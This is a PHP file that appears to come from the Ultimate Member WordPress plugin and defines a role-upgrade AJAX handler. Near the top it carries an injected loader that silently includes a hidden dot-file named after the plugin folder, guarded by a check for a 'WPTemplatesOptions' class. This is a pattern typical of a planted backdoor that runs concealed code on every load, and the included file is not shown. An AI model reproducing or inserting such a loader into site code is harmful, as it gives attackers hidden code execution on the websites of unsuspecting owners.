<?php if ( ! defined( 'ABSPATH' ) ) exit;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function um_upgrade_roles2054() {
	UM()->admin()->check_ajax_nonce();

	um_maybe_unset_time_limit();

	include 'roles.php';

	update_option( 'um_last_version_upgrade', '2.0.54' );

	wp_send_json_success( array( 'message' => __( 'Roles was upgraded successfully', 'ultimate-member' ) ) );
}